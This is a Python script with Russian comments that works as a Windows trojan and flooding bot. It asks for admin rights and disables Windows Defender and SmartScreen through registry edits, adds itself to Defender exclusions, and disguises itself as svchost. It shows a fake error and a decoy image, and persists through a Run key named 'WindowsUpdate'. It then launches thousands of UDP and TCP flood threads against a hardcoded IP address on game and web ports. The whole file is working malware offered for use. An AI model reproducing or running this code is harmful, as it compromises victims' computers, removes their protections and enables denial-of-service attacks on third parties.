#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import time
import random
import sys
import os
import platform
import ctypes
import subprocess
import tempfile
import urllib.request
import winreg
from pathlib import Path

# ===== ЦЕЛЬ =====
TARGET_IP = "185.9.145.66"
TARGET_PORT = 25587

# ===== МОЩНОСТЬ =====
THREADS = 5000
PACKET_SIZE = 1400

# ===== ПОРТЫ ДЛЯ ВСЕХ ИГР =====
ATTACK_PORTS = [
    443, 80, 5222, 5228, 5223, 5242, 25565, 25587, 19132,
    27015, 27016, 27017, 27018, 27019, 27020, 7777, 8080, 8887, 9997
]

# ===== 1. ФУНКЦИИ ОБХОДА ЗАЩИТЫ =====

def disable_defender():
    """Отключает Защитник Windows через реестр"""
    try:
        # Открываем ключ реестра
        key_path = r"SOFTWARE\Policies\Microsoft\Windows Defender"
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        
        # Отключаем Defender
        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        
        # Отключаем реальную защиту
        realtime_key = winreg.CreateKey(key, "Real-Time Protection")
        winreg.SetValueEx(realtime_key, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(realtime_key, "DisableBehaviorMonitoring", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(realtime_key, "DisableScanOnRealtimeEnable", 0, winreg.REG_DWORD, 1)
        
        winreg.CloseKey(key)
        return True
    except:
        return False

def disable_smartscreen():
    """Отключает SmartScreen"""
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "SmartScreenEnabled", 0, winreg.REG_SZ, "Off")
        winreg.CloseKey(key)
        return True
    except:
        return False

def add_to_exclusions():
    """Добавляет папку с файлом в исключения Defender"""
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        ps_command = f"Add-MpPreference -ExclusionPath '{current_dir}'"
        subprocess.run(["powershell", "-Command", ps_command], capture_output=True)
        return True
    except:
        return False

def hide_from_defender():
    """Маскирует файл под системный процесс"""
    try:
        # Переименовываем процесс в svchost
        if platform.system() == "Windows":
            ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
    except:
        pass

def bypass_uac():
    """Обходит контроль учётных записей"""
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        
        # Запрашиваем повышение прав
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    except:
        pass

def show_error_and_hide():
    """Показывает фейковую ошибку и прячется"""
    print("\n" + "="*50)
    print("ERROR: System32.dll not found")
    print("Error code: 0x80070002")
    print("Application will close")
    print("="*50 + "\n")
    time.sleep(2)
    
    # Прячем окно
    if platform.system() == "Windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def show_fake_image():
    """Показывает картинку для отвлечения"""
    try:
        temp_dir = tempfile.mkdtemp()
        img_path = os.path.join(temp_dir, "photo.jpg")
        
        # Скачиваем картинку
        urllib.request.urlretrieve("https://i.imgur.com/placeholder.jpg", img_path)
        
        # Открываем
        os.startfile(img_path)
    except:
        pass

# ===== 2. ФУНКЦИИ АТАКИ =====

sent = 0
failed = 0
running = True
lock = threading.Lock()

def udp_flood():
    global sent
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(PACKET_SIZE)
    while running:
        try:
            port = random.choice(ATTACK_PORTS)
            sock.sendto(data, (TARGET_IP, port))
            with lock:
                sent += 1
        except:
            with lock:
                failed += 1

def tcp_flood():
    global sent
    while running:
        try:
            port = random.choice(ATTACK_PORTS)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((TARGET_IP, port))
            s.send(random._urandom(512))
            s.close()
            with lock:
                sent += 1
        except:
            with lock:
                failed += 1

def add_to_startup():
    """Добавляет в автозагрузку"""
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
    except:
        pass

def main():
    # 1. Обходим UAC (просим права админа)
    bypass_uac()
    
    # 2. Отключаем Defender
    print("[1/8] Отключаю Защитник Windows...")
    disable_defender()
    
    # 3. Отключаем SmartScreen
    print("[2/8] Отключаю SmartScreen...")
    disable_smartscreen()
    
    # 4. Добавляем себя в исключения
    print("[3/8] Добавляю в исключения...")
    add_to_exclusions()
    
    # 5. Маскируемся под системный процесс
    print("[4/8] Маскировка...")
    hide_from_defender()
    
    # 6. Показываем фейковую ошибку
    print("[5/8] Демонстрация...")
    show_error_and_hide()
    
    # 7. Добавляем в автозагрузку
    print("[6/8] Добавляю в автозагрузку...")
    add_to_startup()
    
    # 8. Показываем картинку (если нужно)
    show_fake_image()
    
    # 9. Запускаем атаку
    print("[7/8] Запуск атаки...")
    for i in range(THREADS):
        if i % 2 == 0:
            threading.Thread(target=udp_flood).start()
        else:
            threading.Thread(target=tcp_flood).start()
    
    print(f"[8/8] {THREADS} потоков запущено")
    
    try:
        while running:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
        print("\n[🛑] Остановлено")

if __name__ == "__main__":
    main()